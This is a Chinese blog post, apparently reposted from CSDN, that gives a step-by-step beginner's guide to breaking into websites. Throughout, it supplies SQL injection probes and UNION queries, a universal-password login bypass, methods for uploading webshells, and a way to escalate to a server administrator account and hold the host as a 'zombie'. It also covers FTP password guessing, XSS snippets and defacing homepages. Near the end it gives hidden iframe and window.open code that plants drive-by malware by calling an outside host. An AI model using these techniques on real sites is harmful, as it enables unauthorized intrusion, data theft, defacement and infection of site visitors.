---
layout: post
title: 网站入侵思路（初级黑客渗透篇）
tags: 基础知识 渗透 渗透思路
categories: 基础知识
published: true
---



 1，〓经典注入〓
     通常，判断一个网站是否存在注入点，可以用’，and 1=1 ,and 1=2,+and+1=1,+and+1=2,%20and%201=1,%20and%201=2,来判断，如果and 1=1正常返回页面，1=2错误，或者找不到，那么就存在注入点
  2，〓万能密码OR漏洞〓
    万能密码'or'='or',可以用在后台管理输入，有的网站由于没有过滤OR漏洞，输入OR直接就可以突破，一般漏洞存在于ASP类型的网站
 3，〓爆库〓
   爆库，可以理解为爆出数据库下载，用爆库之类的工具可以直接就获得管理员用户和密码，%5C为十六进制的\符号，而数据库大于5.0就可以进行爆库，如在PHP手工高级注入时，用VERSION（）这个变量猜出网站数据库版本，如果一个网站数据库大于5.0，且是ACESS数据库，那么提交地址是：http://www.xxx.com/rpc/show24.asp?id=127,我们直接把%5C加到RPC后面，因为%5C是爆二级目录，所以应该是这样，http://www.xxx.com/rpc%5c/show24.asp?id=127,而%23是代表#，如果管理员为了防止他人非法下载数据库，而把数据库改成#database.mdb,这样防止了，如果页面地址为http://www.xx.com/rpd/#database.mdb,是这样的，那么我们把%23加到替换#,http://www.xx.com/rpd/%23database.mdb
  4，〓COOKIE中转，SQL防注入程序，提醒你IP已被记录〓
  COOKIE中转，SQL防注入，如果检测一个网站时，弹出这样一个对话框，上面出现SQL防注入程序提醒的字语，那么我们可以利用COOKIE中转，注入中转来突破，方法是先搭建一个ASP环境（且网站为ASP网站），然后打开中转工具，记住一个网站的页面地址粘贴进工具里，值是多少就写多少，生成，把生成的文件放到目录里，接下来，打开网页，输入http://127.0.0.1:(端口）/目录里文件，如果正常，那么输入http://127.0.0.1:端口/值（目录文件）？提交值，那么拿到工具里猜表名，列名了
  5， 〓手工〓
  ASP手工语句   表名 and exists (select * from 表名)
                             列名 and (select count(列名) from 表名)>0
                             长度 and (select top 1 len(username) from admin)>0
                              内容 and (select top 1 asc(mid(username,1,1)) from admin)>100
PHP手工语句：order by（猜字段），and 1=2 union select  （字段数）and 1=2 union selsect from(位置）
  如果有30个字段，那么就应该在注入地址后输入http://www.xxx.com/showfo.jsp?id=130 and 1=2 union select  1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28.29,30
几个常用变量 ，USER(),VERSION()<数据库版本），database()<数据库名称>
6，〓抓包拿WEBSHELL〓
如果进入后台发现，点数据库备份的时候发现找不到，可以通过抓包来获得上传，拿到WEBSHELL，工具WOSCK抓包，一张图片，一个ASP马，自行搭建一个上传地址，UPLOAD加载，UPFILE上传，COOKIS=（  ）
7，〓数据库备份拿WEBSHELL和一句话木马入侵〓
通常进入后台了，发现有数据库备份，拿WEBSHELL吧，找一个添加产品的地方，传一个大马，格式为JPG图片，然后把图片地址粘贴到数据库备份那里，给起个名字，如SHELL.ASP,然后合地址访问的时候就进入webshell了，一句话木马入侵，先编辑记事本，加入一句话，改为2.jpg,然后备份，访问，发现500内部服务器错误，证明一句话成功，接下来用一句话木马客户端连接，得到路径页面，然后改下马名，输入大马内容，提交，得到WEBSHELL
8，〓DB权限差异备份拿WEBSHELL〓
如果一个网站注入点是MYSQL数据库，且是DB权限，或者是SA权限，能够列目录，那么就好办了，找到网站的目录，目录通常在D和E盘，备份个小马，合地址访问看看成功没，直接备份大马貌似不行，成功后，再输入大马内容，拿到WEBSHELL
9，〓找后台〓
找后台，一般默认为admin,admin/admin.asp,admin/login.asp,.admin_login.asp,manage/login.asp,login.asp,logon,user.asp,admin/index.asp,当然，这只是默认，一些大网站不可能还用admin作为后台，有的隐藏很深，可以简单用site:网站 inurl:后台来猜，或者下载源HTML文件分析找出后台，或者用各种工具来扫描了，方法很多的
10，〓脚本提示〓
有的网站要求进入后台会出现一个脚本提示，就像VB编程里INPUTBOX “”，一个对话输入框，我们输入administrator突破，admin代表以管理员身份来进入
11，〓php后门和EWEBEDITOR编辑器入侵〓
PHP后门，如之前爆出的DISZ漏洞，在一个PHP网站后面加C.PHP,如果出现1，那么传个PHP马就拿到WEBSHELL，EWEBEDITOR编辑器入侵，是很快速的方式，设置好上传文件类型，传ASA，或者其他的格式，然后访问拿到WEBSHELL，如没有直接加语句拿到WEBSHELL
12，〓上传漏洞〓
  有的网站虽然没有注入点，但存在一个上传漏洞，那么我们如何来利用了，首先，打开上传地址看是否存在，如果有，试想传一个ASP大马是不行的，那么传一句话看看，先看能成功不，用明小子来上传，动网，动力，动感，乔客4种方式，页面地址格式要对应，如果一个网站地址弹出对话框，显示上传成功，那么证明可以拿到WEBSHELL，传马，另外有的没有任何显示，直接空的，那么可以构建两个上传，第一个传JPG的图片，第二个传ASP马（大马），记住，大马后面要有个空格才行，如果一个网站地址出现文件类型不正确，请重新上传，那么证明%90可以拿到WEBSHELL，只是格式不对，不允许，改后缀，只要是网站没有过滤的格式，如果一个网站地址显示请登陆再上传，那么证明没有拿到COOKIS，思路是在该网站注册一个用户，得到COOKIS，然后上传就成功了
13，〓简单提权拿下服务器和SERV提权和pcanywhere三方提权〓
简单拿下服务器，也就是拿下网站IP主机，首先我们需要一个WEBSHELL，然后看看组件信息，看看路径可读可以写不，如果有一个可以，那么来到CMD命令下，首先输入可写的文件内容，执行命令加一个帐号和最高管理权限，然后输入netstat -an,得到主机连接端口，然后用3389连接进入，让其成为肉鸡（最好），这样比较隐蔽我们操作
14，〓反查入侵和旁注和社会工程学〓
反查IP入侵，也就是入侵21，端口，首先我们入侵网站先PING WWW.XXX.COM ,出IP，然后到反查IP站点查挂了多少个域名，接下来，添加webmaster@地址，加入字典，（里面多收集可能的口令，如123，321，456），然后用流光探测密码，登陆ftp://ip,输入用户和密码，改掉信息等等，社会工程学X-WAY，来得到FTP密码，也需要收集，并不是每个都行，总之是自己的经验
15，〓跨站脚本攻击〓
跨站（CSS），被动攻击，现在需要更多的思路和经验了
三段经典跨站代码

```
<script>alert("跨站开始")</script>
<script>alert("document.cookie")</script>
<script>window.open(http://www.hackgirl.net)</script>
```
16〓特殊空格〓
利用TAB制作的特殊空格，然后注册时输入空格，加管理名字，随便在网站上找个斑竹，或者管理的名字，这样来注册，有时自己注册的这个也会变成管理员
17，〓改主页〓
改主页，拿到WEBSHELL后，先找出首页文件，一般为index.asp,index.php.index.jsp,index.html,然后来到站点根目录，编辑index.asp(首页），清空，最好备份，输入自己的主页代码（黑页），保存，再访问时已经变成自己想要的结果了
18，〓挂马〓
首先在WEBSHELL里，建立一个文本，改为1.htm,接下来在主页最下面挂
两段经典挂马代码
```html
<html>
<iframe src="http://www.xxxx.com/2.htm" width="0" height="0" frameborder="0"></iframe>
</html>

<SCRIPT language=javascript>         
window.open("http://www.xxx.com/2.htm","","toolbar=no,location=no,directories=no,status=no,menubar=no,scrollbars=no,width=1,height=1");   
</script>
```
19 〓 GOOGLE BACK语句〓（很多）
inurl:asp?id=    ,inurl:show.asp  ,inurl:went.asp ,inurl:jsp?id=,inurl:php?id=
20,〓自寻漏洞〓
自己根据自己的技术经验和积累，找出还没有被发现的漏洞（思路问题了）

C段，旁站，劫持，欺骗，嗅探，社工
————————————————
版权声明：本文为CSDN博主「lizhengnanhua」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。
原文链接：https://blog.csdn.net/lizhengnanhua/java/article/details/39198349